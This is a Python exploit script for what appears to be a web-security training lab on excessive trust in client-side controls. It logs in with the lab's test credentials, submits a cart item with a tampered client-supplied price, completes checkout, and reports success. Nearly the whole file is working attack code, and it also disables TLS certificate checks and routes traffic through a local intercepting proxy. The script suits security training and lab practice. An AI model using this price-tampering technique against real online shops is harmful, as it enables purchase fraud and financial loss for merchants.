import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_csrf_token(r):
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def first_request(url):
    session = requests.Session()
    path = url + "login"
    r1 = session.get(path, verify=False, proxies=proxies)
    csrf_token = get_csrf_token(r1)
    cookie_value = session.cookies.get("session")
    headers = {'Cookie': 'session=' + cookie_value}
    data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
    r2 = session.post(path, data=data, verify=False, headers=headers, proxies=proxies)
    
    path = url + "cart"
    cookie_value = session.cookies.get("session")
    headers = {'Cookie': 'session=' + cookie_value}
    data = {'productId': 1, 'redir': 'PRODUCT', 'quantity':1, 'price':10}
    r3 = session.post(path, data=data, verify=False, headers=headers, proxies=proxies)

    r4 = session.get(path, verify=False, proxies=proxies)

    path = url + "cart/checkout"
    csrf_token = get_csrf_token(r4)
    headers = {'Cookie': 'session=' + cookie_value}
    data = {'csrf': csrf_token}
    r5 = session.post(path, data=data, verify=False, headers=headers, proxies=proxies)
    if "Your order is on its way!" in r5.text:
        print("[+] You have exploited the EXCESSIVE TRUST CONTROL ON CLIENT SIDE!!")
    else:
        print("[-] There is some problem. Please check the script.")


def main():
    url = input("Please Enter the URL: ")
    first_request(url)

if __name__ == "__main__":
    main()